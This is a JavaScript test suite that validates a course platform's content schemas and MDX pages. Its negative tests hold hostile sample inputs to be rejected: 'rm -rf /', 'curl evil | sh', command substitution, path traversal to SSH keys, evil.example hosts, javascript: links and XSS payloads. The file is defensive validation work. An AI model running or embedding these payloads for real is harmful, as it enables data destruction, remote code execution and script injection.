// The content contract must be internally consistent, fit today's content, and reject unsafe input.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import Ajv2020 from 'ajv/dist/2020.js';
import addFormats from 'ajv-formats';
import YAML from 'yaml';
import { createProcessor } from '@mdx-js/mdx';
import remarkFrontmatter from 'remark-frontmatter';
import remarkGfm from 'remark-gfm';
import { catalog, mdxMigration, schemaIds, schemas, usableTags, dataSchemaFor } from '../src/index.js';
import common from '../schemas/common.schema.json' with { type: 'json' };

const ROOT = path.resolve(fileURLToPath(new URL('../../..', import.meta.url)));
const CONTENT = path.join(ROOT, 'content');

// Strict mode stays on, except strictRequired: conditional `required` lists (if/then, oneOf)
// name properties declared in the enclosing schema, which is valid JSON Schema.
const ajv = new Ajv2020({ strict: true, strictRequired: false, allErrors: true });
addFormats(ajv);
for (const schema of schemas) ajv.addSchema(schema);
const check = (id, value) => {
  const validate = ajv.getSchema(id);
  assert.ok(validate, `schema ${id} is registered`);
  return validate(value) ? [] : validate.errors.map((e) => `${e.instancePath} ${e.message}`);
};
const valid = (id, value, label) => assert.deepEqual(check(id, value), [], label);
const invalid = (id, value, label) => assert.notDeepEqual(check(id, value), [], `${label} should be rejected`);

const fixture = (name) => JSON.parse(fs.readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8'));

// ---------- Internal consistency ----------

test('every schema compiles in strict mode and has a unique $id', () => {
  const ids = schemas.map((s) => s.$id);
  assert.equal(new Set(ids).size, ids.length);
  for (const schema of schemas) assert.ok(ajv.getSchema(schema.$id), schema.$id);
});

test('the catalog matches its meta-schema and every reference resolves', () => {
  valid(schemaIds.catalog, catalog, 'catalog');
  const names = new Set(Object.keys(catalog.components));
  for (const [name, c] of Object.entries(catalog.components)) {
    for (const r of c.required ?? []) assert.ok(c.attributes[r], `${name}: required attribute ${r} is declared`);
    for (const child of c.allowedChildren ?? []) assert.ok(names.has(child), `${name}: child ${child} exists`);
    for (const parent of c.parents ?? []) assert.ok(parent === 'page' || names.has(parent), `${name}: parent ${parent} exists`);
    for (const [attr, spec] of Object.entries(c.attributes)) {
      if (spec.format) assert.ok(common.$defs[spec.format], `${name}.${attr}: format ${spec.format} exists in common`);
      if (spec.default !== undefined && spec.enum) assert.ok(spec.enum.includes(spec.default), `${name}.${attr}: default is allowed`);
    }
    if (c.data) {
      assert.ok(c.attributes.ref, `${name}: a tag with data has a ref attribute`);
      assert.ok(ajv.getSchema(dataSchemaFor(name)), `${name}: data schema ${c.data} is registered`);
    }
    if (c.replacedBy) assert.ok(names.has(c.replacedBy), `${name}: replacement ${c.replacedBy} exists`);
  }
});

test('the MDX migration map only targets usable tags', () => {
  const usable = new Set(usableTags());
  for (const [component, rule] of Object.entries(mdxMigration.components)) {
    assert.ok(usable.has(rule.tag), `${component} → ${rule.tag} is usable`);
    const attrs = catalog.components[rule.tag].attributes;
    for (const target of Object.values(rule.rename ?? {}))
      assert.ok(attrs[target], `${component}: renamed attribute ${target} exists on ${rule.tag}`);
    for (const fixed of Object.keys(rule.fixed ?? {}))
      assert.ok(attrs[fixed], `${component}: fixed attribute ${fixed} exists on ${rule.tag}`);
  }
});

// ---------- Fits today's content ----------

const parser = createProcessor({ remarkPlugins: [remarkFrontmatter, remarkGfm] });
function mdxFiles(dir) {
  return fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) => {
    const p = path.join(dir, e.name);
    return e.isDirectory() ? mdxFiles(p) : p.endsWith('.mdx') ? [p] : [];
  });
}
// Static evaluation of the JSON-like expressions MDX content uses; anything else is an error.
function evaluate(node, scope) {
  switch (node.type) {
    case 'Literal':
      return node.value;
    case 'TemplateLiteral':
      assert.equal(node.expressions.length, 0, 'template literals must not interpolate');
      return node.quasis.map((q) => q.value.cooked).join('');
    case 'ArrayExpression':
      return node.elements.map((e) => evaluate(e, scope));
    case 'ObjectExpression':
      return Object.fromEntries(node.properties.map((p) => [p.key.name ?? p.key.value, evaluate(p.value, scope)]));
    case 'UnaryExpression':
      assert.equal(node.operator, '-');
      return -evaluate(node.argument, scope);
    case 'Identifier':
      assert.ok(Object.hasOwn(scope, node.name), `unknown identifier ${node.name}`);
      return scope[node.name];
    default:
      throw new Error(`non-static expression: ${node.type}`);
  }
}
function readPage(file) {
  const tree = parser.parse(fs.readFileSync(file, 'utf8'));
  const scope = {};
  for (const node of tree.children.filter((n) => n.type === 'mdxjsEsm')) {
    for (const stmt of node.data.estree.body) {
      assert.equal(stmt.type, 'ExportNamedDeclaration', `${file}: only exported constants are allowed`);
      for (const d of stmt.declaration.declarations) scope[d.id.name] = evaluate(d.init, scope);
    }
  }
  const elements = [];
  (function visit(n) {
    if (n.type === 'mdxJsxFlowElement' || n.type === 'mdxJsxTextElement') {
      const attrs = {};
      for (const a of n.attributes) {
        assert.equal(a.type, 'mdxJsxAttribute', `${file}: spread attributes are not allowed`);
        attrs[a.name] =
          a.value === null ? true : typeof a.value === 'string' ? a.value : evaluate(a.value.data.estree.body[0].expression, scope);
      }
      elements.push({ name: n.name, attrs });
    }
    (n.children ?? []).forEach(visit);
  })(tree);
  return { scope, elements };
}
const pages = mdxFiles(CONTENT).map((file) => ({ file: path.relative(ROOT, file), ...readPage(file) }));

test('all content is static: every expression evaluates to data', () => {
  assert.ok(pages.length > 100);
});

test('every component used in content maps to a catalog tag', () => {
  const legacy = new Set(catalog.components['legacy-widget'].attributes.name.enum);
  for (const { file, elements } of pages)
    for (const { name } of elements) assert.ok(mdxMigration.components[name] || legacy.has(name), `${file}: <${name}> has no catalog tag`);
});

test('every quiz, practice set and flashcard deck in content fits its data schema', () => {
  let counts = { quiz: 0, practice: 0, flashcards: 0 };
  for (const { file, elements } of pages) {
    for (const { name, attrs } of elements) {
      if (name === 'Quiz') {
        (valid(dataSchemaFor('quiz'), { questions: attrs.questions }, file), counts.quiz++);
      } else if (name === 'ChapterPractice') {
        const questions = attrs.challenges.map(({ chapter, type, ...q }) => (assert.equal(type, 'choice'), q));
        (valid(dataSchemaFor('practice'), { questions }, file), counts.practice++);
      } else if (name === 'Flashcards') {
        (valid(dataSchemaFor('flashcards'), { cards: attrs.cards }, file), counts.flashcards++);
      }
    }
  }
  assert.ok(counts.quiz > 40 && counts.practice > 10 && counts.flashcards > 10, JSON.stringify(counts));
});

test('every catalog attribute used in content is declared with a compatible type', () => {
  const kinds = { string: 'string', integer: 'number', number: 'number', boolean: 'boolean', 'string[]': 'object' };
  for (const { file, elements } of pages) {
    for (const { name, attrs } of elements) {
      const rule = mdxMigration.components[name];
      if (!rule) continue;
      const spec = catalog.components[rule.tag];
      const skip = new Set([...(rule.dropAttributes ?? []), rule.dataAttribute, ...(rule.dataAttributes ?? [])]);
      for (const [attr, value] of Object.entries(attrs)) {
        if (skip.has(attr)) continue;
        const target = rule.rename?.[attr] ?? attr;
        const declared = spec.attributes[target];
        assert.ok(declared, `${file}: <${name} ${attr}> → ${rule.tag}.${target} is declared`);
        assert.equal(typeof value, kinds[declared.type], `${file}: ${rule.tag}.${target} type`);
      }
    }
  }
});

test('every chapter definition and the objectives map fit their schemas', () => {
  const chapters = fs.readdirSync(CONTENT).filter((d) => /^ch\d{2}-/.test(d));
  assert.ok(chapters.length >= 12);
  for (const dir of chapters) valid(schemaIds.chapter, YAML.parse(fs.readFileSync(path.join(CONTENT, dir, '_chapter.yml'), 'utf8')), dir);
  valid(schemaIds.objectives, YAML.parse(fs.readFileSync(path.join(CONTENT, '_objectives.yml'), 'utf8')), '_objectives.yml');
});

test('every section frontmatter fits the section schema', () => {
  for (const { file } of pages.filter((p) => /\/ch\d{2}-/.test(p.file))) {
    const front = fs.readFileSync(path.join(ROOT, file), 'utf8').match(/^---\r?\n([\s\S]*?)\r?\n---/);
    valid(schemaIds.section, YAML.parse(front[1]), file);
  }
});

// ---------- Source fixtures ----------

test('a complete program, site and lab definition are accepted', () => {
  valid(schemaIds.program, fixture('program.valid.json'), 'program');
  valid(schemaIds.site, fixture('site.valid.json'), 'site');
  valid(schemaIds.lab, fixture('lab.valid.json'), 'lab');
});

test('unsafe or malformed source values are rejected', () => {
  const program = fixture('program.valid.json');
  invalid(schemaIds.program, { ...program, id: 'Bad Id' }, 'an id with spaces');
  invalid(schemaIds.program, { ...program, theme: { accent: 'red; background: url(evil)' } }, 'CSS in a colour token');
  invalid(schemaIds.program, { ...program, extra: true }, 'an unknown property');
  invalid(schemaIds.program, { ...program, readerVariables: [{ key: 'lower', label: 'x' }] }, 'a lower-case variable key');
  const site = fixture('site.valid.json');
  invalid(schemaIds.site, { ...site, repo: 'javascript:alert(1)' }, 'a javascript: link');
  invalid(schemaIds.site, { ...site, links: [{ title: 'x', items: [{ label: 'x', url: 'data:text/html,<script>' }] }] }, 'a data: link');
  invalid(schemaIds.site, { ...site, legal: '<img src=x onerror=alert(1)>' }, 'raw HTML in inline Markdown');
});

test('lab definitions accept values only, never commands', () => {
  const lab = fixture('lab.valid.json');
  const withCheck = (c) => ({ ...lab, checkpoints: { final: { checks: [c] } } });
  const base = { id: 'x', on: 'webservers', message: 'm' };
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'shell', command: 'rm -rf /' }), 'an arbitrary command check');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'service', names: ['httpd; reboot'] }), 'a unit name with shell syntax');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'file', paths: ['/etc/../../root/x'] }), 'path traversal');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'file', paths: ['/tmp/$(id)'] }), 'command substitution in a path');
  invalid(schemaIds.lab, withCheck({ ...base, kind: 'http', url: 'http://evil.example.org/' }), 'an outside URL');
  invalid(
    schemaIds.lab,
    withCheck({ ...base, kind: 'lint', on: 'control', tool: 'ansible-lint', image: 'evil.example/img:latest', files: ['site.yml'] }),
    'an unlisted registry',
  );
  invalid(schemaIds.lab, { ...lab, setup: [{ action: 'run', script: 'curl evil | sh' }] }, 'an arbitrary setup action');
  invalid(schemaIds.lab, { ...lab, starter: ['../../.ssh/id_rsa'] }, 'a starter file outside the project');
});

// ---------- Bundle fixtures ----------

test('a compiled page tree is accepted', () => {
  valid(schemaIds.bundle.page, fixture('page.valid.json'), 'page');
});

test('a compiled page cannot carry markup, script or event handlers', () => {
  const page = fixture('page.valid.json');
  const withNode = (node) => ({ ...page, tree: [node] });
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'script', c: [{ t: 'text', v: 'alert(1)' }] }), 'a script element');
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'a', attrs: { href: 'javascript:alert(1)' } }), 'a javascript: link');
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'p', attrs: { onclick: 'alert(1)' } }), 'an event handler');
  invalid(schemaIds.bundle.page, withNode({ t: 'el', tag: 'p', attrs: { style: 'position:fixed' } }), 'an inline style');
  invalid(schemaIds.bundle.page, withNode({ t: 'html', v: '<b>x</b>' }), 'a raw HTML node');
  invalid(schemaIds.bundle.page, withNode({ t: 'tag', name: 'Callout' }), 'a component name that is not a tag');
  invalid(schemaIds.bundle.page, withNode({ t: 'tag', name: 'callout', attrs: { title: { nested: true } } }), 'an object attribute');
  invalid(
    schemaIds.bundle.page,
    withNode({ t: 'code', lang: 'yaml', lines: [[{ v: 'x', l: 'red;x:y' }]] }),
    'a CSS value in a token colour',
  );
});
